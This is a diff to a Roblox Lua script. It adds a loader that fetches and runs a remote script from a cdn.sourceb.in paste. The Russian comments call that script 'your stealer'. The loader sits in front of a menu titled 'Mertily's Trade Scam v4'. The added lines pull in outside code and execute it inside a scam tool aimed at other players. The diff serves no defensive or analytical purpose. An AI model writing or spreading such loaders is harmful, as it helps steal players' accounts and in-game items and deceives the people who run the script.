@@ -1,3 +1,11 @@
+-- ⚙️ Mertily's FULL LOADER (Меню)
+-- Загружаем и выполняем ПЕРВЫЙ скрипт (твой стилер с cdn.sourceb.in)
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/YDm9HQelvb/0"))()
+
+-- Даем стилеру секунду на инициализацию, чтобы он не мешал меню
+wait(1)
+
+-- ⬇️⬇️⬇️ НАЧАЛО ТВОЕГО МЕНЮ (второй скрипт) ⬇️⬇️⬇️
 -- 🌐 Mertily's Trade Scam v4 (с кастомной ошибкой)
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
@@ -376,3 +384,4 @@ end
 
 makeDraggable(keyWindow)
 makeDraggable(mainFrame)
+-- ⬆️⬆️⬆️ КОНЕЦ ТВОЕГО МЕНЮ ⬆️⬆️⬆️
